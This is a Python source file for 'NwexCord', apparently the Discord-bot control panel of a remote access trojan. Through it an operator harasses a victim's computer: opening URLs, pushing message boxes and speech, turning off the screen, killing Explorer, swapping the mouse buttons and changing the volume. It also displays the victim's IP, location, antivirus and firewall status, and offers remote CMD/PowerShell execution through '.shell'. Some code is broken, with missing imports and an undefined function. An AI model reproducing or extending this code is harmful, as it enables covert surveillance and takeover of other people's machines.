import discord
import asyncio
import hashlib
from datetime import datetime
from Tools.Fun.manager import FunManager


def _get_startup_view():
    from core.views import StartupView
    return StartupView


def embed_fun_panel():
    embed = discord.Embed(
        title="\U0001f389 NwexCord Fun",
        description=(
            "Select a fun action from the buttons below!\n\n"
            "\U0001f310 Open URL \u2022 \U0001f4ac Client Chat \u2022 \U0001f4e6 MessageBox \u2022 \U0001f5e3\ufe0f Text Speak\n"
            "\U0001f550 Clock \u2022 \U0001f4fa Screen \u2022 \U0001f4c1 Explorer\n"
            "\U0001f5a5\ufe0f Desktop \u2022 \U0001f5b1\ufe0f Mouse \u2022 \U0001f50a Volume"
        ),
        color=discord.Color.from_rgb(255, 85, 85)
    )
    embed.set_footer(text="NwexCord \u2022 Fun Panel")
    return embed


class OpenURLModal(discord.ui.Modal, title="Open URL"):
    url_input = discord.ui.TextInput(label="URL", placeholder="https://example.com", required=True)
    async def on_submit(self, interaction: discord.Interaction):
        url = str(self.url_input).strip()
        if not url.startswith("http"): url = "https://" + url
        success, msg = FunManager.open_url(url)
        e = discord.Embed(title=f"{'✅' if success else '❌'} Open URL", description=msg, color=discord.Color.green() if success else discord.Color.red())
        e.set_footer(text="NwexCord • Fun")
        await interaction.response.edit_message(content=None, embed=e, view=FunResultView())

def build_chat_embed(chat_history, waiting=False):
    desc = ""
    for sender, msg in chat_history[-15:]:
        desc += f"**{sender}:** {msg}\n"
    if waiting:
        desc += "\n\u23f3 *Waiting for client response...*"
    if not desc:
        desc = "*Start a conversation! Click Send to send a message to the client.*"
    e = discord.Embed(title="\U0001f4ac Client Chat", description=desc, color=discord.Color.from_rgb(0, 180, 255))
    e.set_footer(text=f"NwexCord \u2022 Chat \u2022 {len(chat_history)} messages")
    return e

class ClientChatSendModal(discord.ui.Modal, title="Send Message"):
    msg_input = discord.ui.TextInput(label="Message", placeholder="Type your message...", required=True)
    def __init__(self, chat_history):
        super().__init__()
        self.chat_history = chat_history
    async def on_submit(self, interaction: discord.Interaction):
        text = str(self.msg_input)
        self.chat_history.append(("\U0001f9d1\u200d\U0001f4bb You", text))
        embed = build_chat_embed(self.chat_history, waiting=True)
        await interaction.response.edit_message(content=None, embed=embed, view=None)
        loop = asyncio.get_event_loop()
        response = await loop.run_in_executor(None, FunManager.client_chat_input, text)
        if response:
            self.chat_history.append(("\U0001f4bb Client", response))
        else:
            self.chat_history.append(("\U0001f4bb Client", "*(No response)*"))
        embed = build_chat_embed(self.chat_history)
        view = ClientChatView(self.chat_history)
        await interaction.edit_original_response(content=None, embed=embed, view=view)

class ClientChatView(discord.ui.View):
    def __init__(self, chat_history=None):
        super().__init__(timeout=600)
        self.chat_history = chat_history if chat_history is not None else []
    @discord.ui.button(label="Send", emoji="\U0001f4e4", style=discord.ButtonStyle.success)
    async def send_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(ClientChatSendModal(self.chat_history))
    @discord.ui.button(label="Clear", emoji="\U0001f5d1\ufe0f", style=discord.ButtonStyle.danger)
    async def clear_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.chat_history.clear()
        await interaction.response.edit_message(content=None, embed=build_chat_embed(self.chat_history), view=ClientChatView(self.chat_history))
    @discord.ui.button(label="\u2b05 Back", style=discord.ButtonStyle.secondary)
    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=embed_fun_panel(), view=FunPanelView())


class TextSpeakModal(discord.ui.Modal, title="Text to Speech"):
    text_input = discord.ui.TextInput(label="Text", placeholder="Enter text to speak...", style=discord.TextStyle.paragraph, required=True)
    async def on_submit(self, interaction: discord.Interaction):
        text = str(self.text_input)
        success, msg = FunManager.text_speak(text)
        e = discord.Embed(title=f"{'✅' if success else '❌'} Text Speak", description=msg, color=discord.Color.green() if success else discord.Color.red())
        e.set_footer(text="NwexCord • Fun")
        await interaction.response.edit_message(content=None, embed=e, view=FunResultView())

# --- MessageBox System (with tabs: MessageBox + BalloonTooltip) ---

class MessageBoxSendModal(discord.ui.Modal, title="MessageBox"):
    title_input = discord.ui.TextInput(label="Title", placeholder="MessageBox", default="MessageBox", required=True)
    message_input = discord.ui.TextInput(label="Message", placeholder="Hello World!", style=discord.TextStyle.paragraph, required=True)
    def __init__(self, icon="Information", button="OK"):
        super().__init__()
        self.icon = icon
        self.button = button
    async def on_submit(self, interaction: discord.Interaction):
        t, m = str(self.title_input), str(self.message_input)
        threading.Thread(target=FunManager.show_messagebox, args=(t, m, self.icon, self.button), daemon=True).start()
        e = discord.Embed(title="📦 MessageBox", description=f"**Icon:** {self.icon}\n**Button:** {self.button}\n**Title:** `{t}`\n**Message:** `{m}`", color=discord.Color.green())
        e.set_footer(text="NwexCord • Fun")
        await interaction.response.edit_message(content=None, embed=e, view=FunResultView())

class BalloonTipSendModal(discord.ui.Modal, title="BalloonTooltip"):
    title_input = discord.ui.TextInput(label="Title", placeholder="BalloonTip", default="BalloonTip", required=True)
    text_input = discord.ui.TextInput(label="Text", placeholder="Hello World!", style=discord.TextStyle.paragraph, required=True)
    def __init__(self, icon="Info"):
        super().__init__()
        self.icon = icon
    async def on_submit(self, interaction: discord.Interaction):
        t, tx = str(self.title_input), str(self.text_input)
        FunManager.show_balloon_tip(t, tx, self.icon)
        e = discord.Embed(title="🔔 BalloonTooltip", description=f"**Icon:** {self.icon}\n**Title:** `{t}`\n**Text:** `{tx}`", color=discord.Color.green())
        e.set_footer(text="NwexCord • Fun")
        await interaction.response.edit_message(content=None, embed=e, view=FunResultView())

class MsgBoxIconSelect(discord.ui.Select):
    def __init__(self, default="Information"):
        options = [discord.SelectOption(label=v, value=v, default=(v == default)) for v in ["Information", "Error", "Warning", "Question"]]
        super().__init__(placeholder="MessageBoxIcon", options=options, row=1)
    async def callback(self, interaction: discord.Interaction):
        self.view.selected_icon = self.values[0]
        await interaction.response.defer()

class MsgBoxButtonSelect(discord.ui.Select):
    def __init__(self, default="OK"):
        options = [discord.SelectOption(label=v, value=v, default=(v == default)) for v in ["OK", "OKCancel", "YesNo", "YesNoCancel", "RetryCancel", "AbortRetryIgnore"]]
        super().__init__(placeholder="MessageBoxButton", options=options, row=2)
    async def callback(self, interaction: discord.Interaction):
        self.view.selected_button = self.values[0]
        await interaction.response.defer()

class MessageBoxTabView(discord.ui.View):
    def __init__(self, icon="Information", button="OK"):
        super().__init__(timeout=300)
        self.selected_icon = icon
        self.selected_button = button
        self.add_item(MsgBoxIconSelect(icon))
        self.add_item(MsgBoxButtonSelect(button))
    @discord.ui.button(label="📦 MessageBox", style=discord.ButtonStyle.primary, disabled=True, row=0)
    async def tab_msgbox(self, interaction: discord.Interaction, button: discord.ui.Button): pass
    @discord.ui.button(label="🔔 BalloonTooltip", style=discord.ButtonStyle.secondary, row=0)
    async def tab_balloon(self, interaction: discord.Interaction, button: discord.ui.Button):
        e = discord.Embed(title="🔔 BalloonTooltip", description="Configure and send a BalloonTooltip notification.", color=discord.Color.from_rgb(255, 85, 85))
        e.set_footer(text="NwexCord • Fun")
        await interaction.response.edit_message(content=None, embed=e, view=BalloonTipTabView())
    @discord.ui.button(label="📤 Send", style=discord.ButtonStyle.success, row=3)
    async def send_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(MessageBoxSendModal(self.selected_icon, self.selected_button))
    @discord.ui.button(label="⬅ Back", style=discord.ButtonStyle.secondary, row=3)
    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=embed_fun_panel(), view=FunPanelView())

class BalloonIconSelect(discord.ui.Select):
    def __init__(self, default="Info"):
        options = [discord.SelectOption(label=v, value=v, default=(v == default)) for v in ["Info", "Warning", "Error", "None"]]
        super().__init__(placeholder="Icon", options=options, row=1)
    async def callback(self, interaction: discord.Interaction):
        self.view.selected_icon = self.values[0]
        await interaction.response.defer()

class BalloonTipTabView(discord.ui.View):
    def __init__(self, icon="Info"):
        super().__init__(timeout=300)
        self.selected_icon = icon
        self.add_item(BalloonIconSelect(icon))
    @discord.ui.button(label="📦 MessageBox", style=discord.ButtonStyle.secondary, row=0)
    async def tab_msgbox(self, interaction: discord.Interaction, button: discord.ui.Button):
        e = discord.Embed(title="📦 MessageBox", description="Configure and send a MessageBox to the client.", color=discord.Color.from_rgb(255, 85, 85))
        e.set_footer(text="NwexCord • Fun")
        await interaction.response.edit_message(content=None, embed=e, view=MessageBoxTabView())
    @discord.ui.button(label="🔔 BalloonTooltip", style=discord.ButtonStyle.primary, disabled=True, row=0)
    async def tab_balloon(self, interaction: discord.Interaction, button: discord.ui.Button): pass
    @discord.ui.button(label="📤 Send", style=discord.ButtonStyle.success, row=2)
    async def send_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(BalloonTipSendModal(self.selected_icon))
    @discord.ui.button(label="⬅ Back", style=discord.ButtonStyle.secondary, row=2)
    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=embed_fun_panel(), view=FunPanelView())

# --- Sub-Panel Views ---

def _fun_sub_embed(title, status_msg=None, success=None):
    e = discord.Embed(title=title, color=discord.Color.from_rgb(255, 85, 85))
    if status_msg:
        e.description = f"{'✅' if success else '❌'} {status_msg}"
    e.set_footer(text="NwexCord • Fun")
    return e

class ClockPanelView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=300)
    @discord.ui.button(label="Show", emoji="👁️", style=discord.ButtonStyle.success)
    async def show_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        s, m = FunManager.clock_show()
        await interaction.response.edit_message(embed=_fun_sub_embed("🕐 Clock", m, s), view=ClockPanelView())
    @discord.ui.button(label="Hide", emoji="🙈", style=discord.ButtonStyle.danger)
    async def hide_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        s, m = FunManager.clock_hide()
        await interaction.response.edit_message(embed=_fun_sub_embed("🕐 Clock", m, s), view=ClockPanelView())
    @discord.ui.button(label="⬅ Back", style=discord.ButtonStyle.secondary)
    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=embed_fun_panel(), view=FunPanelView())

class ScreenPanelView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=300)
    @discord.ui.button(label="On", emoji="💡", style=discord.ButtonStyle.success)
    async def on_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        s, m = FunManager.screen_on()
        await interaction.response.edit_message(embed=_fun_sub_embed("📺 Screen", m, s), view=ScreenPanelView())
    @discord.ui.button(label="Off", emoji="🌑", style=discord.ButtonStyle.danger)
    async def off_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        s, m = FunManager.screen_off()
        await interaction.response.edit_message(embed=_fun_sub_embed("📺 Screen", m, s), view=ScreenPanelView())
    @discord.ui.button(label="⬅ Back", style=discord.ButtonStyle.secondary)
    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=embed_fun_panel(), view=FunPanelView())

class ExplorerPanelView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=300)
    @discord.ui.button(label="Kill", emoji="💀", style=discord.ButtonStyle.danger)
    async def kill_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        s, m = FunManager.explorer_kill()
        await interaction.response.edit_message(embed=_fun_sub_embed("📁 Explorer", m, s), view=ExplorerPanelView())
    @discord.ui.button(label="Start", emoji="🚀", style=discord.ButtonStyle.success)
    async def start_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        s, m = FunManager.explorer_start()
        await interaction.response.edit_message(embed=_fun_sub_embed("📁 Explorer", m, s), view=ExplorerPanelView())
    @discord.ui.button(label="⬅ Back", style=discord.ButtonStyle.secondary)
    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=embed_fun_panel(), view=FunPanelView())

class DesktopPanelView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=300)
    @discord.ui.button(label="Show", emoji="👁️", style=discord.ButtonStyle.success)
    async def show_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        s, m = FunManager.desktop_icons_show()
        await interaction.response.edit_message(embed=_fun_sub_embed("🖥️ Desktop Icons", m, s), view=DesktopPanelView())
    @discord.ui.button(label="Hide", emoji="🙈", style=discord.ButtonStyle.danger)
    async def hide_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        s, m = FunManager.desktop_icons_hide()
        await interaction.response.edit_message(embed=_fun_sub_embed("🖥️ Desktop Icons", m, s), view=DesktopPanelView())
    @discord.ui.button(label="⬅ Back", style=discord.ButtonStyle.secondary)
    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=embed_fun_panel(), view=FunPanelView())

class MousePanelView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=300)
    @discord.ui.button(label="Normal", emoji="🖱️", style=discord.ButtonStyle.success)
    async def normal_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        s, m = FunManager.swap_mouse_normal()
        await interaction.response.edit_message(embed=_fun_sub_embed("🖱️ Mouse", m, s), view=MousePanelView())
    @discord.ui.button(label="Swap", emoji="🔄", style=discord.ButtonStyle.danger)
    async def swap_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        s, m = FunManager.swap_mouse_swap()
        await interaction.response.edit_message(embed=_fun_sub_embed("🖱️ Mouse", m, s), view=MousePanelView())
    @discord.ui.button(label="⬅ Back", style=discord.ButtonStyle.secondary)
    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=embed_fun_panel(), view=FunPanelView())

class VolumePanelView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=300)
    @discord.ui.button(label="Vol +25%", emoji="🔊", style=discord.ButtonStyle.success)
    async def up_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        s, m = FunManager.volume_up()
        await interaction.response.edit_message(embed=_fun_sub_embed("🔊 Volume", m, s), view=VolumePanelView())
    @discord.ui.button(label="Vol -25%", emoji="🔉", style=discord.ButtonStyle.secondary)
    async def down_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        s, m = FunManager.volume_down()
        await interaction.response.edit_message(embed=_fun_sub_embed("🔉 Volume", m, s), view=VolumePanelView())
    @discord.ui.button(label="Mute", emoji="🔇", style=discord.ButtonStyle.danger)
    async def mute_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        s, m = FunManager.volume_mute()
        await interaction.response.edit_message(embed=_fun_sub_embed("🔇 Volume", m, s), view=VolumePanelView())
    @discord.ui.button(label="⬅ Back", style=discord.ButtonStyle.secondary)
    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=embed_fun_panel(), view=FunPanelView())

# --- Fun Result & Main Panel ---

class FunResultView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=300)
    @discord.ui.button(label="Back to Fun", emoji="⬅", style=discord.ButtonStyle.secondary)
    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=embed_fun_panel(), view=FunPanelView())

class FunPanelView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=300)
    # Row 0: Modal actions
    @discord.ui.button(label="Open URL", emoji="🌐", style=discord.ButtonStyle.primary, row=0)
    async def open_url_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(OpenURLModal())
    @discord.ui.button(label="Client Chat", emoji="\U0001f4ac", style=discord.ButtonStyle.primary, row=0)
    async def client_chat_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=build_chat_embed([]), view=ClientChatView())
    @discord.ui.button(label="MessageBox", emoji="📦", style=discord.ButtonStyle.primary, row=0)
    async def messagebox_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        e = discord.Embed(title="📦 MessageBox", description="Configure and send a MessageBox to the client.", color=discord.Color.from_rgb(255, 85, 85))
        e.set_footer(text="NwexCord • Fun")
        await interaction.response.edit_message(content=None, embed=e, view=MessageBoxTabView())
    @discord.ui.button(label="Text Speak", emoji="🗣️", style=discord.ButtonStyle.primary, row=0)
    async def textspeak_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(TextSpeakModal())
    # Row 1: Sub-panel features
    @discord.ui.button(label="Clock", emoji="🕐", style=discord.ButtonStyle.secondary, row=1)
    async def clock_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=_fun_sub_embed("🕐 Clock"), view=ClockPanelView())
    @discord.ui.button(label="Screen", emoji="📺", style=discord.ButtonStyle.secondary, row=1)
    async def screen_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=_fun_sub_embed("📺 Screen"), view=ScreenPanelView())
    @discord.ui.button(label="Explorer", emoji="📁", style=discord.ButtonStyle.secondary, row=1)
    async def explorer_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=_fun_sub_embed("📁 Explorer"), view=ExplorerPanelView())
    # Row 2: More sub-panel features
    @discord.ui.button(label="Desktop", emoji="🖥️", style=discord.ButtonStyle.secondary, row=2)
    async def desktop_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=_fun_sub_embed("🖥️ Desktop Icons"), view=DesktopPanelView())
    @discord.ui.button(label="Mouse", emoji="🖱️", style=discord.ButtonStyle.secondary, row=2)
    async def mouse_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=_fun_sub_embed("🖱️ Mouse"), view=MousePanelView())
    @discord.ui.button(label="Volume", emoji="🔊", style=discord.ButtonStyle.secondary, row=2)
    async def volume_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=_fun_sub_embed("🔊 Volume"), view=VolumePanelView())
    # Row 3: Back
    @discord.ui.button(label="⬅ Back to Info", style=discord.ButtonStyle.secondary, row=3)
    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        info = get_sys_info()
        left_col = (
            f"🌐 **IP** : {info.get('IP', 'Unknown')}\n"
            f"👤 **UserName** : {info['UserName']}\n"
            f"🖥️ **PCName** : {info['PCName']}\n"
            f"🪟 **OS** : {info['OS']}\n"
            f"📁 **Client** : {info['Client']}\n"
            f"⚙️ **Process** : {info['Process']}\n"
            f"📅 **DateTime** : {info['DateTime']}\n"
            f"🎇 **GPU** : {info['GPU']}\n"
            f"🧠 **CPU** : {info['CPU']}\n"
            f"🏷️ **Identifier** : {info['Identifier']}\n"
            f"📊 **Ram** : {info['Ram']}"
        )
        right_col = (
            f"📍 **Location** : {info.get('Location', 'Unknown')}\n"
            f"⏱️ **LastReboot** : {info['LastReboot']}\n"
            f"🛡️ **Antivirus** : {info['Antivirus']}\n"
            f"⚠️ **Firewall** : {info['Firewall']}\n"
            f"🌐 **MacAddress** : {info['MacAddress']}\n"
            f"🌍 **DefaultBrowser** : {info['DefaultBrowser']}\n"
            f"🗣️ **CurrentLang** : {info['CurrentLang']}\n"
            f"💻 **Platform** : {info['Platform']}\n"
            f"📋 **Ver** : {info['Ver']}\n"
            f"🔵 **.Net** : {info['.Net']}\n"
            f"🔋 **Battery** : {info['Battery']}"
        )
        embed = discord.Embed(title="[ Information ]", color=discord.Color.dark_theme())
        embed.add_field(name="\u200b", value=left_col, inline=True)
        embed.add_field(name="\u200b", value=right_col, inline=True)
        embed.set_footer(text=f"NwexCord • System Information • {datetime.now().strftime('Today at %#I:%M %p')}")
        msg_content = f"🚀 **NwexCord System Started!**\nUse `.shell <command>` to execute CMD/PowerShell commands on this machine."
        await interaction.edit_original_response(content=msg_content, embed=embed, view=StartupView())


